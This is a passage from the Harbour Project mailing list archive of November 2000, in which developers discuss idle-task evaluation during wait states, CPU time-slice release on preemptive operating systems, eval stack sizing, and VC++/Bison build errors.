Your first sentence looks OK to me.  A real OS will already have such
an idle task, or it may halt the processor (or both of these <g>).
On many systems halting the CPU saves a lot of power.  I would not
want a Clipper "idle" task to foul that up.  However, a background
process might be a different case.

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:03:13 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:03:13 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011231758_MC2-BBFF-338B@compuserve.com>

Ryszard,

"function parameters are placed on the stack before the number of =

local variables is known"

Keep it simple. <g>  Leave room for N locals, for large N.  Not long
ago we were discussing (OK, not entirely seriously) a 1MB stack.
Suppose we started with 100K instead.  And if there's not room for
(say) 1000 locals we allocate the next 100K stack block.  Surely that
has to be plenty, yet it saves 800K even in this ridiculously bloated
case.  Probably a typical app would in fact never go beyond the first
block, so we just saved 900K. :-)

Er... I didn't check yet how big a LOCAL is (probably not Clipper's
14 bytes), but maybe the idea is good enough.

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:04:59 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:04:59 2000
Subject: [Harbour] Alaska's site
Message-ID: <200011231758_MC2-BBFF-3387@compuserve.com>

Dave,

[About URL / ISBN]

:-)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:05:43 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:05:43 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011231758_MC2-BBFF-3386@compuserve.com>

Ron,

"Enough of the suspense already ;-)"

:-)

"What is you OOP problem?"

I get:
  Error BASE/1004  No exported method: ...
for things that definitely are (exported etc), and worked previously.
(I also get at least one other similarly wrong error, depending on the
sample.)

The good news is that Jean may have fixed it, the bad news is that
I have still to persuade Harbour to build with VC++ like it used to.

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:06:42 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 18:06:42 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEGJDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEGKDHAA.ron@profit-master.com>

Maurilio,

So sorry!!!

I added a return; line after my test and before posting, and I forgot to
precede it with s_bIamIdle = FALSE;

Please try again...

Sorry again!

Ron

> Maurilio,
>
> Are you sure?
>
> It works perfectly here! I can see the time etc. refreshed repeatedly.
>
> ???
>
> Ron
>
> > Sorry Ron,
> >
> > it doesn't work. idle task is called only once.
> >
> > regards.
> >
> > Maurilio Longo ha scritto:


From harbour@lists.harbour-project.org  Thu Nov 23 18:08:03 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 18:08:03 2000
Subject: [Harbour] VC++ compiler other problem ...
In-Reply-To: <202011232149.0ANLn5A30734@localhost.localdomain>
Message-ID: <202011232248.0ANMmHA09020@localhost.localdomain>

I retryed to compile but this time with make_vc.bat and makefile.vc 
...

now I receive ;

	cl -c -Iinclude -TP -W3 -nologo    -w -Foobj\vc\macroy.obj 
obj\vc\macroy.c
macroy.c
bison.simple(207) : error C2065: 'pMacro' : undeclared identifier
bison.simple(208) : error C2448: '<Unknown>' : function-style 
initializer appears to be a function definition
bison.simple(208) : fatal error C1004: unexpected end of file found


about the previous error I posted, I missed to specify that this error  
appeared when trying top compile a simplex version

> Hi,
> 
> I'm trying to recompile Harbour with MSVC++ 6.0 and receive many 
> errors like ;
> 
> obj\vc\harboury.c(237) : warning C4129: 'c' : 
> unrecognized character escape sequence
> 
> reading the Bison generated c code I read ;
> 
> #line 279 "source\compiler\harbour.sly"
> 
> wich seem to fool VC++
> 
> Any Idea ?
> 
> 
> Best regards,
> 
> J. Lefebvre,
> Bruxelles,
> Belgium
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 18:08:50 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:08:50 2000
Subject: [Harbour] VC++ compiler and harboury.c problem ...
Message-ID: <200011231803_MC2-BBFB-192B@compuserve.com>

Jean,

"trying to recompile Harbour with MSVC++ 6.0 and receive many =

errors ... reading the Bison generated ..."

Maybe you have an old bison?  I had to use a newer one (and found I
had 1.28 from somewhere - probably the FSF / GNU site).

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:09:51 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 18:09:51 2000
Subject: [Harbour] getting old CVS snapshots
Message-ID: <200011231758_MC2-BBFF-3388@compuserve.com>

Ryszard,

"It just reminded me to add a forward declaration to dbfcdx1.h"

:-)

"  Please try to add 'extern'"

I did that before reporting it. :-)  Made no difference. :-(

"or remove declartion and include hbapigt.h instead"

Will try it.  Thanks for the idea. :-)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 18:11:05 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 18:11:05 2000
Subject: [Harbour] 2000-11-23 00:10 UTC+0100 jfl (mafact) <jfl@mafact.com>
Message-ID: <202011232254.0ANMsNA09834@localhost.localdomain>

2000-11-23 00:10 UTC+0100 jfl (mafact) <jfl@mafact.com>
   * source/compiler/harbour.c
     * added missing parenthesis giving a warning error with VC++


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 18:15:05 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 18:15:05 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <04e201c055a1$38338510$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEGMDHAA.ron@profit-master.com>

Victor,

> We'd a feature in Harbour which was more or less the same
> purpose as the FT_ONIDLE() well known CA-Clipper function.

Can you please explain the Clipper FT_ONIDLE(), I am not familiar with this.

> Now for some unknown reasons (fixing something which
> already worked for years ?), we have a new approach here.

1. I am not forcing us to have any approach, I posted a minor correction,
trying to address some concern. If it is not the right/preferred solution,
I'll be glad to help in implementing the better solution.

2. Can you please explain, what is not working correctly now?

> My question is why wasn't it good as it was ?

1. It was calling GC repeatedly for every iteration within a *single* Wait
State, which is redundant, expensive and inconsiderate of CPU resources.

2. It was evaluating all Idle Blocks repeatedly which again is redundant,
expensive and inconsiderate of CPU resources.

3. It was Releasing CPU before completing required tasks (GC and Idle
Blocks).

> What will this fix ?

Will no longer waste CPU resources needlessly.

> Why create a new purpose for the idle task feature ?

What new purpose?

> Why question the validity of something which was working for
> many people in many apps ?

Can you please explain what was working for many people in many apps, and
longer does?

Ron


From harbour@lists.harbour-project.org  Thu Nov 23 18:16:04 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 18:16:04 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <200011231758_MC2-BBFF-3386@compuserve.com>
Message-ID: <202011232300.0ANN0bA10416@localhost.localdomain>

Hi John

> The good news is that Jean may have fixed it, the bad news is that
> I have still to persuade Harbour to build with VC++ like it used to.

The bad new (for me ;-) ) is that I'm really fighting here with VC++ 
and Harbour and actually I can't say I'm winning <GG> 

Yes I'm sure now why I love our friend B$ll G$tte ...

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 18:20:04 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Thu Nov 23 18:20:04 2000
Subject: [Harbour] VC++ compiler and harboury.c problem ...
In-Reply-To: <200011231803_MC2-BBFB-192B@compuserve.com>
Message-ID: <202011232304.0ANN4fA10919@localhost.localdomain>

Good morning ;-)  John,

Humm, seem to be a version 1.24, 

ok will try to find 1.28 ... Thkx,

> Jean,
> 
> "trying to recompile Harbour with MSVC++ 6.0 and receive many 
> errors ... reading the Bison generated ..."
> 
> Maybe you have an old bison?  I had to use a newer one (and found I
> had 1.28 from somewhere - probably the FSF / GNU site).
> 
> John.
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Thu Nov 23 18:33:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 18:33:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEGMDHAA.ron@profit-master.com>
Message-ID: <050801c055a5$e5c0da80$0a0ac8c8@VECWS1>

> Can you please explain the Clipper FT_ONIDLE(), I am not familiar with this.

FT_ONIDLE() is a NanForum toolkit function, which uses 
the CA-Clipper internals to launch the specified block at idle 
times. Very similar to HB_IDLEADD() (as it was before the lates modifs).

>From the NG:
---------------------------------------------------------------------------------
 FT_ONIDLE()
 Evaluate a designated code block during idle states.
---------------------------------------------------------------------------------

 Syntax

      FT_OnIdle( bCode )

 Arguments

     <bCode> is the code block to evaluate.

 Returns

     NIL

 Description

     This function allows you to evaluate code blocks in the background
     while the foreground is in an idle state.

     To halt the evaluation of the code block during idle states, call
     FT_OnIdle() with no arguments.

     This function makes heavy use of several undocumented internal
     routines.  If this fact makes you uncomfortable then don't use
     this function, you putrid pile of chicken excrement.

 Examples


     FT_OnIdle( {|| QOut( "Hey, I'm not busy!" )} )

     Inkey( 0 )    // Let the fun begin

 Source: ONIDLE.C

 Author: Ted Means
---------------------------------------------------------------------------------

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 19:10:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 19:10:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <050801c055a5$e5c0da80$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>

Victor,

>  Examples
>
>      FT_OnIdle( {|| QOut( "Hey, I'm not busy!" )} )
>
>      Inkey( 0 )    // Let the fun begin
>
> Victor Szakats

As I suspected, the example wasn't very educational.

We have few very simple choices to make. Nothing is carved in stone, or
should be perceived that way.

1. Do we want to allow the developer to specify that such Idle Block is to
be executed once per Wait State?
2. Should we default to once or repeating per Wait State?
3. If we do allow such choice, is global setting ok, or do we want it per
Block?

My input regarding these issues in nothing more than suggestions, and input
to be considered.

I believe that we should *not* encourage the concept of a block that
expects/requires to be evaluated multiple times per Wait State, for the
simple reason, that it is not guaranteed to run even once! Thus such
expectation/requirement (which can not be guaranteed), suggests that another
approach/solution should be used instead.

Since I personally, never used such mechanism, I admit my concept of what
could be a good use for such feature is very limited. Can some one please
provide a real world example (outside of the GC), that utilizes this
feature?

I don't mean to be offensive, but I would think that any real usage of such
feature, which requires repeating evaluation on one hand, yet only occurs in
Wait States (and even then is not guaranteed any consideration at all), is
very questionable!

Can any one please provide more info, that will help me resolve the above
conflict?

Obviously, until I learn something new here, I propose the following
answers:

1. YES.
2. Once.
3. Global is ok, but I don't object to individual (yet more pensive)
processing.

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 02:03:04 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 24 02:03:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A1D4FAF.386D40AF@libero.it>
Message-ID: <3A1D8FA7.28147.15B5B4CA@localhost>

On 23 Nov 2000, at 18:11, Maurilio Longo wrote:

> Ryszard,
> 
> this is true under windows 3.11 or MacOS!!!!!
> 
> But please, under preemptive operating systems you DON'T HAVE to
> release cpu because the operating system stops and restarts you at its
> own will!

If this was only true, Clipper would not take Windows to it's knees. 
We know that Clipper without special idle state massaging kills 
Windows performance.

One thing that I have done to my applications at work is to add

ft_ontick( {|| ol_yield(), 3 )

which release a time slice to the operating system about 6 times a 
second. If the OS doesn't have any work to do, it comes right back. 
This makes the applications hover between 90 and 95 % even 
during solid processing runs. It makes a huge difference in 
windows stability and usability.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Fri Nov 24 02:03:35 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 24 02:03:35 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEFLDHAA.ron@profit-master.com>
References: <3A1D4BA8.175.4983F78@localhost>
Message-ID: <3A1D8FA7.2103.15B5B4FC@localhost>

On 23 Nov 2000, at 8:13, Ron Pinkas wrote:

> Ryszard,
> 
> So you suggest we voluntarily give-up *our* time slice, even when we
> know we still have pending tasks to perform?
> 
> Isn't it the job of the O/S to balance the needs of different
> applications?
> 
> Ron

The order doesn't matter. 

Work
Idle Tasks
release

Idle Tasks
Work
release

Both produce the same result unless you are needing a RTOS 
product, which is nearly impossible on Windows anyway.

Either way, all time not spent processing jobs at hand is released. 
CPU usage is identical either order.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Fri Nov 24 02:04:37 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 24 02:04:37 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
References: <050801c055a5$e5c0da80$0a0ac8c8@VECWS1>
Message-ID: <3A1D98CA.6710.15D9626E@localhost>

On 23 Nov 2000, at 16:11, Ron Pinkas wrote:

> Since I personally, never used such mechanism, I admit my concept of
> what could be a good use for such feature is very limited. Can some
> one please provide a real world example (outside of the GC), that
> utilizes this feature?

Monitor a serial port for incoming data.

Put a clock on the screen.

Check hardware ports for toggled states and update status table


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Fri Nov 24 02:05:23 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 24 02:05:23 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com>
References: <040f01c0557a$61aa84b0$0a0ac8c8@VECWS1>
Message-ID: <3A1D98C9.3873.15D9623C@localhost>

On 23 Nov 2000, at 10:39, Ron Pinkas wrote:

> Victor
> 
> > Note that there was a very simple (basically one-liner) .C user
> > program (*) which could completely hog WinNT 4.0, so that only
> > switching off the computer could help. This was fixed in some
> > Service Packs back then.
> >
> > (*) You can find it at www.sysinternals.com
> >
> > Victor Szakats
> 
> Do you have exact link? I couldn't find it.
> 
> Any way, the ability of any task, to hog a Pre-Emptive O/S, is clearly
> an O/S bug.
> 
> Generally speaking, Pre-Emptive O/S should be able to execute multiple
> applications, each consisting of the following:
> 
> while( 1 );
> 
> Without any adverse effect on the O/S responsiveness.

Should but doesn't.

And the problem lies in how preemptiveness is decided.

A higher level request can preempt a lower level process.

In general, in Windows and earlier, OS/2, this meant that interrupts 
could preempt running applications.

Applications were all at the same level unless you did something to 
change that at run time.

This left all applications fighting for CPU time in a handoff 
arrangement, which is proven to not work very good. The only 
improvement on sharing CPU was for interrupts, which could 
process thier jump point nearly immediately instead of waiting for 
the time slice to come around.

Application time slices worked as before. If an application didn't 
give up it's own time slices, eventually(default timeout), the O/S 
would pry it loose and let the next app have some time. This works 
great if the running applications are either all slice releasers or all 
non-slice releasers, but a mixture between the two has the non-
slice releasers hogging all the time due to the default timeout.

But, take the case of Clipper and Windows without anything else 
running. WIndows background processes like video, mouse and 
disk accesses are running at application level. A single bad 
performing app in the application level can make all those other 
services starve for time. 

We've seen it over and over. We must have the applications release 
their time slice on a regular basis.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Fri Nov 24 02:06:23 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 24 02:06:23 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <05d201c05597$c4ff9240$3c01a8c0@creation>
Message-ID: <3A1D98C9.3849.15D9620A@localhost>

On 23 Nov 2000, at 18:53, Felipe G. Coury wrote:

> Maurilio,
> 
> > What if the developer dose *not* want *his* Idle Block to be
> > evaluated repeatedly per Wait State? Don't you think it should be
> > allowed? What do
> you
> > think should be the default?
> As an "outlooker", I will give my opinion: I think Ron's point is
> right. I think in most cases you'll not want repeatedly Idle Block
> evaluation. I think having such hability is the exception and don't
> having is the rule and being so, you can override it with a simple
> command like HB_IDLE_RESET(). I think it makes perfectly sense.

So this means that if you have a clock on the screen using the idle 
block and you come to a user input, the clock stops running?


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Fri Nov 24 02:12:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 24 02:12:02 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <200011232057.VAA14124@pyxis.wanadoo.be>
Message-ID: <001101c055e5$a107f960$0f2aa8c0@fivetechs>

JF,

>> :IsDerivedFrom()
> 
> Ok, I founded the error :-) I will publish the new classes.c within a 
> few moments.

Thanks a lot!

Antonio


From harbour@lists.harbour-project.org  Fri Nov 24 02:36:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 24 02:36:02 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <001101c055e5$a107f960$0f2aa8c0@fivetechs>
Message-ID: <002101c055e8$f46afdc0$0f2aa8c0@fivetechs>

JF,

:IsDerivedFrom() works really ok now.

Many thanks again!


Antonio


From harbour@lists.harbour-project.org  Fri Nov 24 03:15:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 03:15:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D98C9.3849.15D9620A@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEHADHAA.ron@profit-master.com>

Phil,

> > > What if the developer dose *not* want *his* Idle Block to be
> > > evaluated repeatedly per Wait State? Don't you think it should be
> > > allowed? What do
> > you
> > > think should be the default?
> > As an "outlooker", I will give my opinion: I think Ron's point is
> > right. I think in most cases you'll not want repeatedly Idle Block
> > evaluation. I think having such hability is the exception and don't
> > having is the rule and being so, you can override it with a simple
> > command like HB_IDLE_RESET(). I think it makes perfectly sense.
>
> So this means that if you have a clock on the screen using the idle
> block and you come to a user input, the clock stops running?

No. My proposal does allow any Idle Block to request reoccurring processing.

BTW, unless I'm missing something, your Clock *will* stop working, the
second a key is pressed, or might not even begin, if say the GC consumed all
the time between the beginning of the Wait State to the time a key was
pressed.

My question therefore is, why would anyone select such an un-reliable avenue
to perform such tasks? I would argue that  such tasks should be moved to
more appropriates avenues.

My understanding of such feature was that it would be used to perform an
occasional cleanup etc. Tasks that don't have to be performed at any
specific time, or frequency.

Please note, I don't suggest we disallow reoccurring (per Wait State) Idle
Tasks, just wondering whether this should be the default.

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 03:19:02 2000
From: harbour@lists.harbour-project.org (Andi Jahja)
Date: Fri Nov 24 03:19:02 2000
Subject: [Harbour] This Snippet Is Compilable In Clipper
Message-ID: <482569A1.002D766B.00@smtp.aon-asia.com>


request qout

function main()

&("qout")("qout()")

return nil

But won't compile under Harbour. PP master ?



From harbour@lists.harbour-project.org  Fri Nov 24 03:41:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 03:41:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <3A1D8FA7.28147.15B5B4CA@localhost>
Message-ID: <3A1E2973.2A0CA294@libero.it>

Phil,

I can speak about OS/2. I don't need to release time slices from dos
windows running clipper programs. They use 99% of cpu time but are
inside regular priority so all OS code is running in higher privilege
level (or inside devices) and if I have other user programs running they
share cpu power with a little boost to foreground one.

But if I want to have two copies of a clipper program running and I
don't want each of them running at half its speed when executing as
single task I better release cpu slices at idle time.

I fear that under win32 (in particular 95 and 98) the real problem is
that kernel is not reentrant so only one program can be inside kernel at
any given time and this is the real bottleneck and the cause of poor
performance.

regards.

PS. NT, before win2K, was a poor multitasker and a resource hog on its
own. Now win2k multitasks much better but it is still a resource hog.
:-)

Phil Barnett ha scritto:
> 
> On 23 Nov 2000, at 18:11, Maurilio Longo wrote:
> 
> > Ryszard,
> >
> > this is true under windows 3.11 or MacOS!!!!!
> >
> > But please, under preemptive operating systems you DON'T HAVE to
> > release cpu because the operating system stops and restarts you at its
> > own will!
> 
> If this was only true, Clipper would not take Windows to it's knees.
> We know that Clipper without special idle state massaging kills
> Windows performance.
> 
> One thing that I have done to my applications at work is to add
> 
> ft_ontick( {|| ol_yield(), 3 )
> 
> which release a time slice to the operating system about 6 times a
> second. If the OS doesn't have any work to do, it comes right back.
> This makes the applications hover between 90 and 95 % even
> during solid processing runs. It makes a huge difference in
> windows stability and usability.
> 
> --
>               Phil Barnett  mailto:midnight@the-oasis.net
>                        WWW  http://www.the-oasis.net/
>                   FTP Site  ftp://ftp.the-oasis.net
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 03:42:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 03:42:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <3A1D98C9.3849.15D9620A@localhost>
Message-ID: <3A1E29CE.B8786A9F@libero.it>

Phil,

as it is now, yes. :-|

regards.

Phil Barnett ha scritto:
> 
> On 23 Nov 2000, at 18:53, Felipe G. Coury wrote:
> 
> > Maurilio,
> >
> > > What if the developer dose *not* want *his* Idle Block to be
> > > evaluated repeatedly per Wait State? Don't you think it should be
> > > allowed? What do
> > you
> > > think should be the default?
> > As an "outlooker", I will give my opinion: I think Ron's point is
> > right. I think in most cases you'll not want repeatedly Idle Block
> > evaluation. I think having such hability is the exception and don't
> > having is the rule and being so, you can override it with a simple
> > command like HB_IDLE_RESET(). I think it makes perfectly sense.
> 
> So this means that if you have a clock on the screen using the idle
> block and you come to a user input, the clock stops running?
> 
> --
>               Phil Barnett  mailto:midnight@the-oasis.net
>                        WWW  http://www.the-oasis.net/
>                   FTP Site  ftp://ftp.the-oasis.net
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 03:54:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 03:54:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
Message-ID: <3A1E2C68.B9D82C43@libero.it>

Ron,

1 yes
2 repeating
3 per block

Please note that the guarantee that a block will be executed is a simple
Inkey(0).

As soon as I reach that statement I know that all my idle state tasks
(which I have developed and so I know how they behave) will have a
chance to run.

It seems clear to me (and to others here) that I won't use idle tasks in
a program which doesn't have user interaction.

regards.


Ron Pinkas ha scritto:
> 
> Victor,
> 
> >  Examples
> >
> >      FT_OnIdle( {|| QOut( "Hey, I'm not busy!" )} )
> >
> >      Inkey( 0 )    // Let the fun begin
> >
> > Victor Szakats
> 
> As I suspected, the example wasn't very educational.
> 
> We have few very simple choices to make. Nothing is carved in stone, or
> should be perceived that way.
> 
> 1. Do we want to allow the developer to specify that such Idle Block is to
> be executed once per Wait State?
> 2. Should we default to once or repeating per Wait State?
> 3. If we do allow such choice, is global setting ok, or do we want it per
> Block?
> 
> My input regarding these issues in nothing more than suggestions, and input
> to be considered.
> 
> I believe that we should *not* encourage the concept of a block that
> expects/requires to be evaluated multiple times per Wait State, for the
> simple reason, that it is not guaranteed to run even once! Thus such
> expectation/requirement (which can not be guaranteed), suggests that another
> approach/solution should be used instead.
> 
> Since I personally, never used such mechanism, I admit my concept of what
> could be a good use for such feature is very limited. Can some one please
> provide a real world example (outside of the GC), that utilizes this
> feature?
> 
> I don't mean to be offensive, but I would think that any real usage of such
> feature, which requires repeating evaluation on one hand, yet only occurs in
> Wait States (and even then is not guaranteed any consideration at all), is
> very questionable!
> 
> Can any one please provide more info, that will help me resolve the above
> conflict?
> 
> Obviously, until I learn something new here, I propose the following
> answers:
> 
> 1. YES.
> 2. Once.
> 3. Global is ok, but I don't object to individual (yet more pensive)
> processing.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 04:07:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 04:07:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKEEHADHAA.ron@profit-master.com>
Message-ID: <3A1E2F8E.AA7DA617@libero.it>

Ron,

I understand your concerns, but I think that many of us, here, consider
idle tasks a "poor man threads" and use them in such a way.

Interactive programs and ever increasing cpu power give such tasks a
great probability of being executed again and again.

regards.

Ron Pinkas ha scritto:
> 
> Phil,
> 
> > > > What if the developer dose *not* want *his* Idle Block to be
> > > > evaluated repeatedly per Wait State? Don't you think it should be
> > > > allowed? What do
> > > you
> > > > think should be the default?
> > > As an "outlooker", I will give my opinion: I think Ron's point is
> > > right. I think in most cases you'll not want repeatedly Idle Block
> > > evaluation. I think having such hability is the exception and don't
> > > having is the rule and being so, you can override it with a simple
> > > command like HB_IDLE_RESET(). I think it makes perfectly sense.
> >
> > So this means that if you have a clock on the screen using the idle
> > block and you come to a user input, the clock stops running?
> 
> No. My proposal does allow any Idle Block to request reoccurring processing.
> 
> BTW, unless I'm missing something, your Clock *will* stop working, the
> second a key is pressed, or might not even begin, if say the GC consumed all
> the time between the beginning of the Wait State to the time a key was
> pressed.
> 
> My question therefore is, why would anyone select such an un-reliable avenue
> to perform such tasks? I would argue that  such tasks should be moved to
> more appropriates avenues.
> 
> My understanding of such feature was that it would be used to perform an
> occasional cleanup etc. Tasks that don't have to be performed at any
> specific time, or frequency.
> 
> Please note, I don't suggest we disallow reoccurring (per Wait State) Idle
> Tasks, just wondering whether this should be the default.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 04:10:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 04:10:02 2000
Subject: [Harbour] 2000-11-23 13:15 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEGKDHAA.ron@profit-master.com>
Message-ID: <3A1E302A.DC7C7819@libero.it>

Ron,

works ok with your latest changes. Thanks.


Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> So sorry!!!
> 
> I added a return; line after my test and before posting, and I forgot to
> precede it with s_bIamIdle = FALSE;
> 
> Please try again...
> 
> Sorry again!
> 
> Ron
> 
> > Maurilio,
> >
> > Are you sure?
> >
> > It works perfectly here! I can see the time etc. refreshed repeatedly.
> >
> > ???
> >
> > Ron
> >
> > > Sorry Ron,
> > >
> > > it doesn't work. idle task is called only once.
> > >
> > > regards.
> > >
> > > Maurilio Longo ha scritto:
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 05:02:02 2000
